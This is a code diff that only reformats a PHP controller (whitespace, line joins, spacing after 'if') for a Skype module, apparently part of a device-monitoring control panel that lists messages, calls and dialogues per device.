@@ -28,14 +28,12 @@ class Skype extends BaseModuleController
             switch ($this->params['tab']) {
                 case 'messages':
                     $data = $skypeModel->getMessagesDataTableData(
-                            $this->di['devId'], 
-                            $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
+                            $this->di['devId'], $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
                     );
                     break;
                 case 'calls':
                     $data = $skypeModel->getCallsDataTableData(
-                            $this->di['devId'], 
-                            $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
+                            $this->di['devId'], $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
                     );
                     break;
             }
@@ -43,7 +41,7 @@ class Skype extends BaseModuleController
             $this->makeJSONResponse($data);
         }
 
-        
+
         if ($this->view->paid) {
             $this->view->accounts = $skypeModel->getAccountsList($this->di['devId']);
             $this->view->hasRecords = count($this->view->accounts);
@@ -57,23 +55,23 @@ class Skype extends BaseModuleController
         $skypeModel = new \Models\Cp\Skype($this->di);
 
         if ($this->getRequest()->isAjax()) {
-            
+
             $currPage = ($this->getRequest()->hasPost('currPage') && $this->getRequest()->post('currPage') > 0) ? $this->getRequest()->post('currPage') : 0;
             $perPage = ($this->getRequest()->hasPost('perPage') && $this->getRequest()->post('perPage') > 0) ? $this->getRequest()->post('perPage') : $this->lengthPage;
             $search = ($this->getRequest()->hasPost('search')) ? $this->getRequest()->post('search') : false;
-            
+
             $data = array();
-            if($this->params['tab'] == 'private')
+            if ($this->params['tab'] == 'private')
                 $data = $skypeModel->getItemsPrivateList($this->di['devId'], $this->params['account'], $this->params['id'], $search, $currPage, $perPage);
-            
-            if($this->params['tab'] == 'group')
+
+            if ($this->params['tab'] == 'group')
                 $data = $skypeModel->getItemsGroupList($this->di['devId'], $this->params['account'], $this->params['id'], $search, $currPage, $perPage);
-            
+
             $this->makeJSONResponse($data);
         }
-        
+
         $dialogueExists = false;
-        
+
         switch ($this->params['tab']) {
             case 'group':
                 $dialogueExists = $skypeModel->isGroupDialogueExists($this->di['devId'], $this->params['account'], $this->params['id']);
@@ -101,7 +99,7 @@ class Skype extends BaseModuleController
         $this->view->tab = $this->params['tab'];
         $this->view->id = $this->params['id'];
         $this->view->account = $this->params['account'];
-        
+
         $this->setView('cp/skypeList.htm');
     }
 
@@ -124,14 +122,14 @@ class Skype extends BaseModuleController
         $this->buildCpMenu();
 
         $this->view->title = $this->di['t']->_('Skype');
-        
-        if($this->di['currentDevice']['os'] != 'icloud'){
+
+        if ($this->di['currentDevice']['os'] != 'icloud') {
             $this->view->customTimezoneOffset = 0;
         }
-        
+
         $this->view->moduleId = Modules::SKYPE;
     }
-    
+
     protected function isModulePaid()
     {
         $devicesLimitations = new Limitations($this->di['db']);
